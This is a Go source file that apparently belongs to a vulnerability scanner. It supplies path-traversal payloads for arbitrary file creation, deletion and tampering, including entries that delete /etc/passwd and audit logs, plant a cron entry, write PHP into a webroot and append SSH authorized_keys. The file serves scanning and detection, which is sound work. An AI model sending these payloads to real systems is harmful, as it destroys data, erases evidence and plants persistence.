// Package fileops provides path-traversal payloads targeting file-write
// sinks (Arbitrary_File_Creation), file-delete sinks
// (Arbitrary_File_Deletion), and existing-file-overwrite sinks
// (File_Tampering) — mirroring AWVS Arbitrary_File_Creation.script,
// Arbitrary_File_Deletion.script, and File_Tampering.script.
//
// Distinct from LFI because the sink is a write/unlink/move call rather
// than include/fread. The traversal primitives are shared with LFI but
// the verification leg is different: instead of reading back leaked
// content, the detector verifies that a marker file landed (or vanished)
// at a path the attacker would otherwise have no access to.
package fileops

// Operation classifies the targeted sink type.
type Operation string

const (
	OperationCreate Operation = "create"
	OperationDelete Operation = "delete"
	OperationTamper Operation = "tamper"
)

// Payload represents a path-traversal value for a file-ops sink.
type Payload struct {
	Value       string
	Operation   Operation
	Description string
}

// GetPayloads returns all file-ops payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByOperation returns payloads filtered by operation.
func GetByOperation(op Operation) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Operation == op {
			out = append(out, p)
		}
	}
	return out
}

// VerifyMarker returns the canonical marker string for confirm-vuln
// landings. Detectors generate one marker per scan to avoid stale
// confirmations bleeding across runs; this constant is the prefix used
// to identify and scrub the markers after the scan.
func VerifyMarker() string {
	return "assay-fileops-c41a6f7e-3b48-4e9f-9bda-b1e2d5c7a210"
}

var payloads = []Payload{
	// --- Arbitrary file creation ---
	{Value: "../../../../tmp/" + VerifyMarker() + ".txt", Operation: OperationCreate, Description: "POSIX traversal write to /tmp"},
	{Value: "../../../var/www/html/" + VerifyMarker() + ".php", Operation: OperationCreate, Description: "Write attacker PHP into webroot"},
	{Value: "..\\..\\..\\..\\windows\\temp\\" + VerifyMarker() + ".txt", Operation: OperationCreate, Description: "Windows traversal write to %TEMP%"},
	{Value: "%2e%2e%2f%2e%2e%2ftmp%2f" + VerifyMarker() + ".txt", Operation: OperationCreate, Description: "URL-encoded traversal write"},
	{Value: "....//....//tmp/" + VerifyMarker() + ".txt", Operation: OperationCreate, Description: "Double-dot/slash bypass write"},
	{Value: "/tmp/" + VerifyMarker() + ".txt", Operation: OperationCreate, Description: "Absolute path write (no sanitiser)"},
	{Value: "../../../../tmp/" + VerifyMarker() + ".txt%00.png", Operation: OperationCreate, Description: "NULL-byte truncation (PHP < 5.3)"},

	// --- Arbitrary file deletion ---
	{Value: "../../../../tmp/" + VerifyMarker() + ".txt", Operation: OperationDelete, Description: "POSIX traversal unlink in /tmp"},
	{Value: "..\\..\\..\\..\\windows\\temp\\" + VerifyMarker() + ".txt", Operation: OperationDelete, Description: "Windows traversal unlink"},
	{Value: "%2e%2e%2f%2e%2e%2ftmp%2f" + VerifyMarker() + ".txt", Operation: OperationDelete, Description: "URL-encoded traversal unlink"},
	{Value: "../../../../etc/passwd", Operation: OperationDelete, Description: "Delete-targeting /etc/passwd (high-impact)"},
	{Value: "../../../../var/log/audit/audit.log", Operation: OperationDelete, Description: "Delete audit log (evidence destruction)"},

	// --- File tampering (overwrite existing) ---
	{Value: "../../../../var/www/html/index.html", Operation: OperationTamper, Description: "Overwrite webroot index"},
	{Value: "../../../../var/www/html/index.php", Operation: OperationTamper, Description: "Overwrite webroot index.php"},
	{Value: "..\\..\\..\\..\\inetpub\\wwwroot\\Default.aspx", Operation: OperationTamper, Description: "Overwrite IIS Default.aspx"},
	{Value: "../../../../etc/cron.d/" + VerifyMarker(), Operation: OperationTamper, Description: "Plant cron entry (post-tamper RCE)"},
	{Value: "../../../../etc/passwd", Operation: OperationTamper, Description: "Overwrite /etc/passwd (catastrophic)"},
	{Value: "../../../../../.ssh/authorized_keys", Operation: OperationTamper, Description: "Append SSH authorized_keys for persistence"},
	{Value: "%2e%2e%2f%2e%2e%2fhtdocs%2findex.html", Operation: OperationTamper, Description: "URL-encoded webroot overwrite"},
}
